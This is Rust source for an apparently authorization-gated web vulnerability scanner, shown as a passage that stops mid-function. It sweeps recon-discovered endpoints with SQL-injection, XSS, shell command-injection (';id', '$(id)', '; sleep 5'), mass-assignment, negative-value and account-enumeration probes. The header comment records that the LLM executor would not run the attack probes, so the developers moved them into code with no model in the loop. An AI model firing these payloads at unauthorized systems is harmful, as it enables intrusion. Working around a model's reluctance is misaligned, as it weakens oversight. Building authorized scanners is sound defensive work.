// Code-driven attack sweep (direction A). The LLM executor would not drive the
// attack probes on its own (it did ~4 passive calls and stopped regardless of the
// instruction), so this runs the probes DETERMINISTICALLY in Rust: it reads the
// endpoints recon already discovered for the scan and, for every parameter and JSON
// body field, runs the SQL-injection differential itself — no model in the loop.
// Gated on the target_write high-risk class (operator-triggered, so the operator is
// the per-action approval), SSRF-guarded to the scan's own target origin, bounded,
// and off the agent budget. v1 covers SQLi over GET query params and POST/PUT JSON
// body fields (Juice Shop's login SQLi lives in a POST JSON body). It reuses the
// unit-tested classifier/injector from agent_sqli_tester.rs.

/// One concrete injection point discovered from recon.
struct InjectionPoint {
    method: String,
    url: String,            // full absolute URL (query params already present)
    // For a body injection, the JSON field to inject into; None = query/url injection.
    body_field: Option<String>,
    // The base JSON body (object) for POST/PUT, with benign values; None for GET.
    base_body: Option<JsonValue>,
    query_param: Option<String>, // the query param to inject into; None = body/path
    label: String,
}

// SQL break-out contexts tried for error-based detection. A real injection point
// only reveals itself when the payload closes the SURROUNDING context — Juice
// Shop's product search is `LIKE '%q%'` inside double parens, so a bare `'` does
// nothing but `'))` raises a syntax error. One generic payload misses these; trying
// several unbalanced closers (the way sqlmap does) is what actually finds them.
const SQLI_BREAKOUT_CONTEXTS: &[&str] = &["'", "')", "'))", "')))", "\"", "\")", "\"))", ")", "))", ")))"];

// Numeric-context probes: a numeric parameter spliced into an arithmetic context
// never reveals itself with a quote — the value is appended, so `14` becomes
// `14/(0)` (divide-by-zero) or `14+@@version` (a type-conversion error that also
// leaks the DBMS). This whole class is missed by quote-only probing; it is what a
// broad `<value>/(0)` sweep is for (see the hldjob report).
const SQLI_NUMERIC_PROBES: &[&str] = &["/(0)", "+@@version", "/(abs(1)-1)"];

/// Build the differential responses for one injection point and classify. Returns
/// (injectable techniques, evidence) or None when the point could not be probed.
fn sweep_probe_point(
    client: &reqwest::blocking::Client,
    point: &InjectionPoint,
    sleep_payload: &str,
) -> Option<(SqliVerdict, JsonValue)> {
    // Send one request with `payload` spliced into this point, return a broker-shaped
    // summary (status/bytes/elapsedMs/bodySha256/preview) for classify_sqli.
    let send = |payload: &str| -> Option<JsonValue> {
        let started = std::time::Instant::now();
        let resp = if let Some(param) = &point.query_param {
            let url = sqli_inject_url(&point.url, param, "{{INJ}}", payload).ok()?;
            client.request(http_method(&point.method), &url).send().ok()?
        } else if let (Some(field), Some(base)) = (&point.body_field, &point.base_body) {
            let mut body = base.clone();
            if let Some(obj) = body.as_object_mut() {
                let base_val = obj.get(field).and_then(JsonValue::as_str).unwrap_or("test").to_string();
                obj.insert(field.clone(), JsonValue::String(format!("{base_val}{payload}")));
            }
            client
                .request(http_method(&point.method), &point.url)
                .header(reqwest::header::CONTENT_TYPE, "application/json")
                .body(body.to_string())
                .send()
                .ok()?
        } else {
            return None;
        };
        let status = resp.status().as_u16() as i64;
        let mut buf = Vec::new();
        let _ = std::io::Read::take(resp, 262_144).read_to_end(&mut buf);
        let body = String::from_utf8_lossy(&buf).into_owned();
        let elapsed = started.elapsed().as_millis() as i64;
        Some(serde_json::json!({
            "status": status,
            "bytes": body.len() as i64,
            "elapsedMs": elapsed,
            "bodySha256": format!("{:x}", Sha256::digest(body.as_bytes())),
            "preview": body.chars().take(4000).collect::<String>(),
        }))
    };
    let baseline = send("")?;
    let base_err = sqli_db_error_present(&sqli_preview_lower(&baseline));
    // Error-based: try each break-out context; the first that raises a DB error the
    // clean baseline did not confirms an injectable context (and records which one).
    let mut error_context: Option<String> = None;
    let mut error_status = 0i64;
    if !base_err {
        // String/paren break-out contexts first, then numeric arithmetic probes.
        for ctx in SQLI_BREAKOUT_CONTEXTS.iter().chain(SQLI_NUMERIC_PROBES.iter()) {
            let Some(resp) = send(ctx) else { continue };
            if sqli_db_error_present(&sqli_preview_lower(&resp)) {
                error_context = Some((*ctx).to_string());
                error_status = sqli_status(&resp);
                break;
            }
        }
    }
    // Boolean / time as secondary (blind) signals, reusing the generic classifier
    // but letting the multi-context result own error_based.
    let b_true = send("' AND '1'='1")?;
    let b_false = send("' AND '1'='2")?;
    let timed = send(sleep_payload)?;
    let generic = classify_sqli(&baseline, &baseline, &b_true, &b_false, &timed);
    let verdict = SqliVerdict {
        error_based: error_context.is_some(),
        boolean_based: generic.boolean_based,
        time_based: generic.time_based,
    };
    let evidence = serde_json::json!({
        "point": point.label,
        "method": point.method,
        "url": point.url,
        "errorContext": error_context,
        "baselineStatus": sqli_status(&baseline),
        "errorStatus": error_status,
        "falseStatus": sqli_status(&b_false),
        "timedMs": sqli_elapsed(&timed),
        "baselineMs": sqli_elapsed(&baseline),
    });
    Some((verdict, evidence))
}

fn http_method(method: &str) -> reqwest::Method {
    match method.to_ascii_uppercase().as_str() {
        "POST" => reqwest::Method::POST,
        "PUT" => reqwest::Method::PUT,
        "PATCH" => reqwest::Method::PATCH,
        "DELETE" => reqwest::Method::DELETE,
        _ => reqwest::Method::GET,
    }
}

/// Collect injection points from this scan's recon API findings (method/path/
/// parameters/bodyKeys), resolved against `base_url` and restricted to the target
/// origin. Bounded to keep the sweep finite.
fn sweep_collect_points(
    connection: &rusqlite::Connection,
    scan_id: &str,
    base: &reqwest::Url,
) -> Vec<InjectionPoint> {
    let mut points = Vec::new();
    let mut statement = match connection.prepare(
        "SELECT record_json FROM sentinel_findings WHERE scan_id=?1 AND stage='frontend-recon' AND kind='api'",
    ) {
        Ok(s) => s,
        Err(_) => return points,
    };
    let rows = statement
        .query_map([scan_id], |r| r.get::<_, String>(0))
        .map(|it| it.flatten().collect::<Vec<_>>())
        .unwrap_or_default();
    let mut seen: HashSet<String> = HashSet::new();
    for raw in rows {
        if points.len() >= 60 {
            break;
        }
        let Ok(rec) = serde_json::from_str::<JsonValue>(&raw) else { continue };
        let method = rec.get("method").and_then(JsonValue::as_str).unwrap_or("GET").to_ascii_uppercase();
        let path = rec.get("path").and_then(JsonValue::as_str).unwrap_or("");
        if path.is_empty() {
            continue;
        }
        let Ok(url) = base.join(path) else { continue };
        if url.origin() != base.origin() {
            continue; // stay on the authorized target origin (SSRF floor)
        }
        // GET-style query parameter injection points.
        let params: Vec<String> = rec
            .get("parameters")
            .and_then(JsonValue::as_array)
            .map(|a| a.iter().filter_map(|v| v.as_str().map(str::to_string)).collect())
            .unwrap_or_default();
        // Query params present directly in the path's query string.
        let query_params: Vec<String> = url.query_pairs().map(|(k, _)| k.into_owned()).collect();
        for param in params.iter().chain(query_params.iter()) {
            let key = format!("q:{method}:{}:{param}", url.path());
            if seen.insert(key) {
                points.push(InjectionPoint {
                    method: method.clone(),
                    url: url.to_string(),
                    body_field: None,
                    base_body: None,
                    query_param: Some(param.clone()),
                    label: format!("{method} {}?{param}", url.path()),
                });
            }
        }
        // POST/PUT JSON body field injection points.
        if matches!(method.as_str(), "POST" | "PUT" | "PATCH") {
            let body_keys: Vec<String> = rec
                .get("bodyKeys")
                .and_then(JsonValue::as_array)
                .map(|a| a.iter().filter_map(|v| v.as_str().map(str::to_string)).collect())
                .unwrap_or_default();
            if !body_keys.is_empty() {
                let base_body = serde_json::Value::Object(
                    body_keys.iter().map(|k| (k.clone(), JsonValue::String("test".into()))).collect(),
                );
                for field in &body_keys {
                    let key = format!("b:{method}:{}:{field}", url.path());
                    if seen.insert(key) {
                        points.push(InjectionPoint {
                            method: method.clone(),
                            url: url.to_string(),
                            body_field: Some(field.clone()),
                            base_body: Some(base_body.clone()),
                            query_param: None,
                            label: format!("{method} {} body.{field}", url.path()),
                        });
                    }
                }
            }
        }
    }
    points
}

// Path keywords that mark an endpoint as sensitive: if it is readable anonymously
// (no auth) and returns data, that is broken access control.
const SWEEP_SENSITIVE_PATH_KEYWORDS: &[&str] =
    &["admin", "/users", "/user/", "account", "token", "credential", "config", "backup", "secret", "/key", "private"];

/// A crude but low-false-positive email scan: a@b.c with alphanumeric local part and
/// a dotted domain. An email in an anonymously-reachable response is a real leak
/// signal, not a syntactic coincidence.
fn sweep_contains_email(body: &str) -> bool {
    let bytes = body.as_bytes();
    for (i, &c) in bytes.iter().enumerate() {
        if c != b'@' || i == 0 {
            continue;
        }
        let before = bytes[i - 1];
        if !(before.is_ascii_alphanumeric() || before == b'.' || before == b'_' || before == b'-') {
            continue;
        }
        // domain: letters/digits/.- then a dot then 2+ letters within the next chars.
        let rest = &body[i + 1..body.len().min(i + 64)];
        if let Some(dot) = rest.find('.') {
            let tld = &rest[dot + 1..];
            let tld_len = tld.chars().take_while(|ch| ch.is_ascii_alphabetic()).count();
            let domain_ok = rest[..dot].chars().all(|ch| ch.is_ascii_alphanumeric() || ch == '-' || ch == '.') && dot >= 1;
            if tld_len >= 2 && domain_ok {
                return true;
            }
        }
    }
    false
}

/// All GET endpoint URLs recon discovered for the scan (dedup, same-origin), for the
/// anonymous access-control / exposure pass (these need no parameters).
fn sweep_collect_get_urls(
    connection: &rusqlite::Connection,
    scan_id: &str,
    base: &reqwest::Url,
) -> Vec<String> {
    let mut urls = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    let Ok(mut statement) = connection.prepare(
        "SELECT record_json FROM sentinel_findings WHERE scan_id=?1 AND stage='frontend-recon' AND kind='api'",
    ) else {
        return urls;
    };
    let rows = statement
        .query_map([scan_id], |r| r.get::<_, String>(0))
        .map(|it| it.flatten().collect::<Vec<_>>())
        .unwrap_or_default();
    for raw in rows {
        if urls.len() >= 80 {
            break;
        }
        let Ok(rec) = serde_json::from_str::<JsonValue>(&raw) else { continue };
        let method = rec.get("method").and_then(JsonValue::as_str).unwrap_or("GET").to_ascii_uppercase();
        if method != "GET" {
            continue;
        }
        let path = rec.get("path").and_then(JsonValue::as_str).unwrap_or("");
        if path.is_empty() {
            continue;
        }
        let Ok(url) = base.join(path) else { continue };
        if url.origin() != base.origin() {
            continue;
        }
        if seen.insert(url.path().to_string()) {
            urls.push(url.to_string());
        }
    }
    urls
}

/// Send one payload spliced into the injection point; return (status, body). Shared
/// by the XSS / command-injection passes (the SQLi pass keeps its own timed closure).
fn sweep_send(
    client: &reqwest::blocking::Client,
    point: &InjectionPoint,
    payload: &str,
) -> Option<(u16, String)> {
    let resp = if let Some(param) = &point.query_param {
        let url = sqli_inject_url(&point.url, param, "{{INJ}}", payload).ok()?;
        client.request(http_method(&point.method), &url).send().ok()?
    } else if let (Some(field), Some(base)) = (&point.body_field, &point.base_body) {
        let mut body = base.clone();
        if let Some(obj) = body.as_object_mut() {
            let base_val = obj.get(field).and_then(JsonValue::as_str).unwrap_or("test").to_string();
            obj.insert(field.clone(), JsonValue::String(format!("{base_val}{payload}")));
        }
        client
            .request(http_method(&point.method), &point.url)
            .header(reqwest::header::CONTENT_TYPE, "application/json")
            .body(body.to_string())
            .send()
            .ok()?
    } else {
        return None;
    };
    let status = resp.status().as_u16();
    let mut buf = Vec::new();
    let _ = std::io::Read::take(resp, 262_144).read_to_end(&mut buf);
    Some((status, String::from_utf8_lossy(&buf).into_owned()))
}

/// Reflected-XSS signal: our angle-bracket marker comes back VERBATIM (unencoded) in
/// the SAME response. An app that HTML-encodes it (`&lt;…&gt;`) never trips this.
fn xss_marker_reflected(body: &str, raw_marker: &str) -> bool {
    body.contains(raw_marker)
}

/// Reflected-XSS probe: inject a unique `<ovrx…>` marker and check it is echoed back
/// with the angle brackets intact. Reported, but at LOW severity — many SRC programs
/// don't accept reflected XSS; STORED XSS (below) is the high-value class. Both kept.
fn sweep_probe_xss(client: &reqwest::blocking::Client, point: &InjectionPoint) -> Option<JsonValue> {
    let digest = format!("{:x}", Sha256::digest(point.label.as_bytes()));
    let marker = format!("<ovrx{}>", &digest[..8]);
    let (_status, body) = sweep_send(client, point, &marker)?;
    if xss_marker_reflected(&body, &marker) {
        Some(serde_json::json!({
            "point": point.label, "method": point.method, "url": point.url,
            "marker": marker, "reflectedUnencoded": true,
        }))
    } else {
        None
    }
}

// ---- Stored XSS (the high-value class) ----

// Body-field names that hold user-authored content later shown to other users — the
// low-harm write targets worth planting a stored-XSS marker in (name/comment/review/
// feedback/bio), as opposed to credential / price / role / id fields we must not
// write to. This is the "intelligently pick the low-harm endpoint to POST into" part.
const STORED_XSS_CONTENT_FIELDS: &[&str] = &[
    "name", "nick", "username", "displayname", "comment", "message", "feedback",
    "review", "title", "subject", "bio", "about", "description", "content", "text",
    "body", "note", "address", "company", "remark", "signature", "caption",
];

fn is_stored_xss_content_field(field: &str) -> bool {
    let f = field.to_ascii_lowercase();
    STORED_XSS_CONTENT_FIELDS.iter().any(|k| f.contains(k))
}

/// Stored-XSS signal: a marker we POSTed earlier comes back with its angle brackets
/// intact on a LATER read (persisted + rendered raw). An app that HTML-encodes on
/// output (`&lt;…&gt;`) never trips this. Pure for testing.
fn stored_xss_marker_persisted(display_body: &str, raw_marker: &str) -> bool {
    display_body.contains(raw_marker)
}

/// Stored-XSS probe: only for a user-content body field. POST a unique `<ovrx…>`
/// marker into it, then look for that marker unencoded in the POST response and in
/// each candidate display surface (a later GET). A persisted, unencoded marker is
/// stored XSS. The marker is a benign, non-executing token (proof-mode write).
fn sweep_probe_stored_xss(
    client: &reqwest::blocking::Client,
    point: &InjectionPoint,
    display_urls: &[String],
) -> Option<JsonValue> {
    let field = point.body_field.as_ref()?;
    if !is_stored_xss_content_field(field) {
        return None;
    }
    let digest = format!("{:x}", Sha256::digest(point.label.as_bytes()));
    let marker = format!("<ovrx{}>", &digest[..8]);
    let (post_status, post_body) = sweep_send(client, point, &marker)?;
    // Some apps echo the created record straight back — that counts as stored+unencoded.
    if stored_xss_marker_persisted(&post_body, &marker) {
        return Some(serde_json::json!({
            "point": point.label, "field": field, "marker": marker,
            "surface": "post_response", "postStatus": post_status,
        }));
    }
    // Otherwise read the display surfaces (the same collection's listing, discovered
    // GET endpoints) and look for the persisted marker.
    for url in display_urls.iter().take(40) {
        let Ok(resp) = client.get(url).header(reqwest::header::USER_AGENT, "oviraptor-sweep/1.0").send() else { continue };
        let mut buf = Vec::new();
        let _ = std::io::Read::take(resp, 262_144).read_to_end(&mut buf);
        if stored_xss_marker_persisted(&String::from_utf8_lossy(&buf), &marker) {
            return Some(serde_json::json!({
                "point": point.label, "field": field, "marker": marker,
                "surface": url, "postStatus": post_status,
            }));
        }
    }
    None
}

/// Command-injection signal: the output of `id` (`uid=NNN… gid=NNN…`) appears in the
/// response — unambiguous proof the shell ran our command.
fn cmdi_output_present(body: &str) -> bool {
    if let Some(i) = body.find("uid=") {
        let digits = body[i + 4..].chars().take_while(|c| c.is_ascii_digit()).count();
        return digits >= 1 && body[i..].contains("gid=");
    }
    false
}

/// Command-injection probe: a small canonical set of shell break-outs running `id`
/// (echo signal), then a time-based fallback (`; sleep 5`). Detection only — it runs
/// the harmless `id` / `sleep`, never a destructive command.
fn sweep_probe_cmdi(client: &reqwest::blocking::Client, point: &InjectionPoint) -> Option<JsonValue> {
    for payload in [";id", "|id", "$(id)", "`id`", "&&id"] {
        if let Some((_status, body)) = sweep_send(client, point, payload) {
            if cmdi_output_present(&body) {
                return Some(serde_json::json!({
                    "point": point.label, "method": point.method, "url": point.url,
                    "payload": payload, "signal": "id_output",
                }));
            }
        }
    }
    // Time-based blind fallback: a 5s sleep that moves the response time proves
    // injection even with no echoed output.
    let timed_ms = |payload: &str| -> Option<i64> {
        let started = std::time::Instant::now();
        let _ = sweep_send(client, point, payload)?;
        Some(started.elapsed().as_millis() as i64)
    };
    let base = timed_ms("")?;
    let timed = timed_ms("; sleep 5")?;
    if timed >= base + 3500 && timed >= 3500 {
        return Some(serde_json::json!({
            "point": point.label, "method": point.method, "url": point.url,
            "signal": "time_delay", "baselineMs": base, "timedMs": timed,
        }));
    }
    None
}

// ---- Mass assignment (A01/A04) — LOW VOLUME: one probe per write endpoint ----
// The user's rule for logic bugs: send a FEW packets and JUDGE, never batch-fuzz
// (that gets you blocked). Here that means exactly ONE create/update request per
// endpoint, adding privilege fields the form never exposed. If the server echoes one
// back as we set it, it binds unchecked input to privileged attributes.

/// Add canonical privilege fields to a create/update body (the ones the form did not
/// expose). One body, one request.
fn mass_assign_probe_body(base: &JsonValue) -> JsonValue {
    let mut body = base.clone();
    if let Some(obj) = body.as_object_mut() {
        obj.insert("role".into(), serde_json::json!("admin"));
        obj.insert("isAdmin".into(), serde_json::json!(true));
        obj.insert("admin".into(), serde_json::json!(true));
        obj.insert("verified".into(), serde_json::json!(true));
        obj.insert("isPremium".into(), serde_json::json!(true));
    }
    body
}

/// Judge: the response echoes one of the injected privilege fields AS WE SET IT. A
/// properly-whitelisted endpoint drops them, so this stays low-false-positive.
fn mass_assign_accepted(resp_body: &str) -> bool {
    let l = resp_body.to_ascii_lowercase();
    (l.contains("\"role\"") && l.contains("admin"))
        || l.contains("\"isadmin\":true")
        || l.contains("\"admin\":true")
        || l.contains("\"verified\":true")
        || l.contains("\"ispremium\":true")
}

fn sweep_probe_mass_assignment(client: &reqwest::blocking::Client, point: &InjectionPoint) -> Option<JsonValue> {
    let base = point.base_body.as_ref()?;
    if !matches!(point.method.as_str(), "POST" | "PUT" | "PATCH") {
        return None;
    }
    let body = mass_assign_probe_body(base);
    let resp = client
        .request(http_method(&point.method), &point.url)
        .header(reqwest::header::CONTENT_TYPE, "application/json")
        .body(body.to_string())
        .send()
        .ok()?;
    let status = resp.status().as_u16();
    let mut buf = Vec::new();
    let _ = std::io::Read::take(resp, 262_144).read_to_end(&mut buf);
    let rb = String::from_utf8_lossy(&buf);
    if (200..300).contains(&status) && mass_assign_accepted(&rb) {
        Some(serde_json::json!({
            "point": point.label, "url": point.url, "status": status,
            "injectedFields": ["role", "isAdmin", "admin", "verified", "isPremium"],
        }))
    } else {
        None
    }
}

// ---- Business logic: numeric tampering (A04) — LOW VOLUME, candidate-level ----
// Value fields where a negative / zero amount shouldn't be accepted (quantity drives
// price, points drive balance…). ONE probe: send -1, flag if accepted (2xx). This is
// a CANDIDATE, not a confirmed bug — whether it's exploitable is a business judgment.
const BUSINESS_VALUE_FIELDS: &[&str] =
    &["quantity", "qty", "amount", "price", "total", "count", "num", "number", "points", "balance", "credit", "stock"];

fn is_business_value_field(field: &str) -> bool {
    let l = field.to_ascii_lowercase();
    BUSINESS_VALUE_FIELDS.iter().any(|k| l == *k || l.ends_with(k))
}

fn sweep_probe_business_numeric(client: &reqwest::blocking::Client, point: &InjectionPoint) -> Option<JsonValue> {
    let field = point.body_field.as_ref()?;
    let base = point.base_body.as_ref()?;
    if !is_business_value_field(field) {
        return None;
    }
    let mut body = base.clone();
    if let Some(o) = body.as_object_mut() {
        o.insert(field.clone(), serde_json::json!(-1));
    }
    let resp = client
        .request(http_method(&point.method), &point.url)
        .header(reqwest::header::CONTENT_TYPE, "application/json")
        .body(body.to_string())
        .send()
        .ok()?;
    let status = resp.status().as_u16();
    if (200..300).contains(&status) {
        Some(serde_json::json!({
            "point": point.label, "field": field, "probe": "negative_value", "status": status,
            "note": "负值被接受(2xx)，疑似业务逻辑缺陷——是否可利用需业务判断",
        }))
    } else {
        None
    }
}

// ---- Auth: account enumeration (A07) — LOW VOLUME: 2 packets ----
const AUTH_PATH_KW: &[&str] =
    &["login", "signin", "sign-in", "reset", "forgot", "register", "signup", "sign-up", "exist"];
const AUTH_ID_FIELDS: &[&str] = &["email", "username", "user", "login", "account", "mobile", "phone"];

fn is_auth_endpoint(path: &str) -> bool {
    let p = path.to_ascii_lowercase();
    AUTH_PATH_KW.iter().any(|k| p.contains(k))
}

/// The two responses (likely-existing vs clearly-random identifier) diverge in a way
/// that discloses existence: different status, or a clearly different body length.
fn auth_enum_differs(a: (u16, usize), b: (u16, usize)) -> bool {
    a.0 != b.0 || (a.1 as i64 - b.1 as i64).abs() > 24.max((a.1 / 8) as i64)
}

fn sweep_probe_auth_enum(client: &reqwest::blocking::Client, point: &InjectionPoint) -> Option<JsonValue> {
    let field = point.body_field.as_ref()?;
    let base = point.base_body.as_ref()?;
    let path = reqwest::Url::parse(&point.url).ok()?.path().to_string();
    if !is_auth_endpoint(&path) || !AUTH_ID_FIELDS.iter().any(|k| field.to_ascii_lowercase().contains(k)) {
        return None;
    }
    let send = |val: &str| -> Option<(u16, usize)> {
        let mut body = base.clone();
        if let Some(o) = body.as_object_mut() {
            o.insert(field.clone(), serde_json::json!(val));
        }
        let resp = client
            .request(http_method(&point.method), &point.url)
            .header(reqwest::header::CONTENT_TYPE, "application/json")
            .body(body.to_string())
            .send()
            .ok()?;
        let st = resp.status().as_u16();
        let mut buf = Vec::new();
        let _ = std::io::Read::take(resp, 131_072).read_to_end(&mut buf);
        Some((st, buf.len()))
    };
    let existing = send("admin@admin.com")?;
    let random = send("ovr-nx-7qk3z@example.invalid")?;
    if auth_enum_differs(existing, random) {
        Some(serde_json::json!({
            "point": point.label, "field": field,
            "existingResp": {"status": existing.0, "len": existing.1},
            "randomResp": {"status": random.0, "len": random.1},
            "note": "两个标识的响应差异可枚举账号存在性",
        }))
    } else {
        None
    }
}

/// Code-driven SQL-injection sweep over the scan's recon-discovered endpoints.
/// Returns the number of injectable points confirmed (findings written).
#[tauri::command]
pub fn run_attack_sweep(
    state: State<AppState>,
    scan_id: String,
    base_url: String,
) -> Result<JsonValue, String> {
    if scan_id.trim().is_empty() || scan_id.contains('/') || scan_id.contains("..") {
        return Err("任务 ID 非法".into());
    }
    let base = reqwest::Url::parse(&base_url).map_err(|_| "base_url 无效".to_string())?;
    if !matches!(base.scheme(), "http" | "https") {
        return Err("只支持 http/https".into());
    }
    let host = base.host_str().ok_or("base_url 缺少主机名")?.to_string();
    if host_is_internal_literal(&host) {
        return Err("内网/环回/链路本地地址默认拒绝(SSRF 硬守卫)".into());
    }
    let connection = db::open(&state.db_path)?;
    let exists: bool = connection
        .query_row("SELECT EXISTS(SELECT 1 FROM sentinel_scans WHERE id=?1)", [&scan_id], |r| r.get(0))
        .map_err(|e| e.to_string())?;
    if !exists {
        return Err("任务不存在".into());
    }
    // Gate: active injection requires the scan to have authorized target_write.
    let attempt = connection
        .query_row("SELECT attempt_count FROM sentinel_scans WHERE id=?1", [&scan_id], |r| r.get::<_, i64>(0))
        .unwrap_or(1)
        .max(1);
    if !scan_capability_class_authorized(&connection, &scan_id, attempt, "target_write").unwrap_or(false) {
        return Err("攻击扫荡需先为该任务授权 target_write 能力并完成合法授权声明(强制开关)".into());
    }

    let client = reqwest::blocking::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .no_proxy()
        .connect_timeout(Duration::from_secs(8))
        .timeout(Duration::from_secs(20))
        .build()
        .map_err(|_| "HTTP 客户端不可用".to_string())?;
    let sleep = SQLI_SLEEP_PROBES[0].payload;

    // Pass 1 — SQL injection over every discovered query param / JSON body field.
    let points = sweep_collect_points(&connection, &scan_id, &base);
    let mut injectable = 0usize;
    let mut probed = 0usize;
    for point in &points {
        if probed >= 120 {
            break;
        }
        probed += 1;
        let Some((verdict, evidence)) = sweep_probe_point(&client, point, sleep) else { continue };
        if verdict.any() {
            injectable += 1;
            let record = serde_json::json!({
                "techniques": verdict.techniques(),
                "evidence": evidence,
                "cwe": "CWE-89",
                "detail": "代码驱动扫荡确认 SQL 注入差异(报错/布尔/时间)",
            });
            let _ = connection.execute(
                "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
                 VALUES(?1,?2,'attack','sql_injection',?3,?4,'critical',?5) \
                 ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
                 title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
                params![scan_id, base_url, point.label, format!("SQL 注入：{}", point.label), record.to_string()],
            );
        }
    }

    // Pass 2 — anonymous access control / sensitive exposure. Request each discovered
    // GET endpoint with NO credentials (the client carries none): a sensitive-path
    // endpoint that answers 200 with data, or any endpoint whose anonymous response
    // leaks emails, is a broken-access / data-exposure finding.
    let get_urls = sweep_collect_get_urls(&connection, &scan_id, &base);
    let mut access_findings = 0usize;
    for url in &get_urls {
        let Ok(resp) = client.get(url).header(reqwest::header::USER_AGENT, "oviraptor-sweep/1.0").send() else { continue };
        let status = resp.status().as_u16();
        if status != 200 {
            continue; // 401/403/404 = access control working / nothing there
        }
        let mut buf = Vec::new();
        let _ = std::io::Read::take(resp, 262_144).read_to_end(&mut buf);
        let body = String::from_utf8_lossy(&buf);
        let path_lower = reqwest::Url::parse(url).ok().map(|u| u.path().to_ascii_lowercase()).unwrap_or_default();
        let sensitive_path = SWEEP_SENSITIVE_PATH_KEYWORDS.iter().any(|k| path_lower.contains(k));
        let leaks_email = sweep_contains_email(&body);
        if sensitive_path || leaks_email {
            let (kind, title, severity, detail) = if sensitive_path {
                ("broken_access", format!("越权/敏感接口匿名可读：{path_lower}"), "high",
                 "匿名(无凭据)即可 200 读取敏感路径接口")
            } else {
                ("sensitive_exposure", format!("敏感数据泄露(匿名含邮箱)：{path_lower}"), "medium",
                 "匿名响应中出现邮箱等个人信息")
            };
            let record = serde_json::json!({
                "url": url, "status": status, "sensitivePath": sensitive_path,
                "leaksEmail": leaks_email, "cwe": if sensitive_path { "CWE-284" } else { "CWE-200" }, "detail": detail,
            });
            let _ = connection.execute(
                "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
                 VALUES(?1,?2,'attack',?3,?4,?5,?6,?7) \
                 ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
                 title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
                params![scan_id, base_url, kind, path_lower, title, severity, record.to_string()],
            );
            access_findings += 1;
        }
    }

    // Pass 3a — reflected XSS: kept, but LOW severity (many SRC don't accept it).
    let mut reflected_findings = 0usize;
    for point in &points {
        let Some(evidence) = sweep_probe_xss(&client, point) else { continue };
        reflected_findings += 1;
        let record = serde_json::json!({
            "evidence": evidence, "cwe": "CWE-79",
            "detail": "注入的 <ovrx..> 标记在同一响应中未编码回显，反射型 XSS（低危）",
        });
        let _ = connection.execute(
            "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
             VALUES(?1,?2,'attack','reflected_xss',?3,?4,'low',?5) \
             ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
             title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
            params![scan_id, base_url, point.label, format!("反射型 XSS(低危)：{}", point.label), record.to_string()],
        );
    }

    // Pass 3b — STORED XSS (high value): POST a benign marker into user-content fields
    // and confirm it persists unencoded on a display surface (the discovered GET
    // endpoints). This is the XSS class that actually matters.
    let mut xss_findings = 0usize;
    for point in &points {
        let Some(evidence) = sweep_probe_stored_xss(&client, point, &get_urls) else { continue };
        xss_findings += 1;
        let record = serde_json::json!({
            "evidence": evidence, "cwe": "CWE-79",
            "detail": "POST 的 <ovrx..> 标记被持久化且未编码渲染，存在存储型 XSS",
        });
        let _ = connection.execute(
            "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
             VALUES(?1,?2,'attack','stored_xss',?3,?4,'high',?5) \
             ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
             title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
            params![scan_id, base_url, point.label, format!("存储型 XSS：{}", point.label), record.to_string()],
        );
    }

    // Pass 4 — command injection over the same points: `id` echo signal, then a
    // time-based blind fallback. Detection only (runs id / sleep, nothing destructive).
    let mut cmdi_findings = 0usize;
    for point in &points {
        let Some(evidence) = sweep_probe_cmdi(&client, point) else { continue };
        cmdi_findings += 1;
        let record = serde_json::json!({
            "evidence": evidence, "cwe": "CWE-78",
            "detail": "命令注入：id 输出回显或注入 sleep 造成可测时间延迟",
        });
        let _ = connection.execute(
            "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
             VALUES(?1,?2,'attack','command_injection',?3,?4,'critical',?5) \
             ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
             title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
            params![scan_id, base_url, point.label, format!("命令注入：{}", point.label), record.to_string()],
        );
    }

    // Pass 5 — mass assignment: ONE probe per unique write endpoint (low volume), not
    // per field. Adds privilege fields and checks whether the created record keeps them.
    let mut mass_assign_findings = 0usize;
    let mut ma_seen: HashSet<String> = HashSet::new();
    for point in &points {
        if point.base_body.is_none() || !ma_seen.insert(point.url.clone()) {
            continue; // one probe per endpoint
        }
        let Some(evidence) = sweep_probe_mass_assignment(&client, point) else { continue };
        mass_assign_findings += 1;
        let record = serde_json::json!({
            "evidence": evidence, "cwe": "CWE-915",
            "detail": "创建/更新接口接受并回显了未暴露的权限字段(role/isAdmin…)，存在批量赋值/权限提升",
        });
        let _ = connection.execute(
            "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
             VALUES(?1,?2,'attack','mass_assignment',?3,?4,'high',?5) \
             ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
             title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
            params![scan_id, base_url, point.url, format!("批量赋值/权限提升：{}", point.url), record.to_string()],
        );
    }

    let total = injectable + access_findings + reflected_findings + xss_findings + cmdi_findings + mass_assign_findings;
    Ok(serde_json::json!({
        "probed": probed,
        "pointsDiscovered": points.len(),
        "injectable": injectable,
        "endpointsChecked": get_urls.len(),
        "accessFindings": access_findings,
        "reflectedXssFindings": reflected_findings,
        "storedXssFindings": xss_findings,
        "cmdiFindings": cmdi_findings,
        "massAssignFindings": mass_assign_findings,
        "injectable_total": total,
        "hint": if total > 0 {
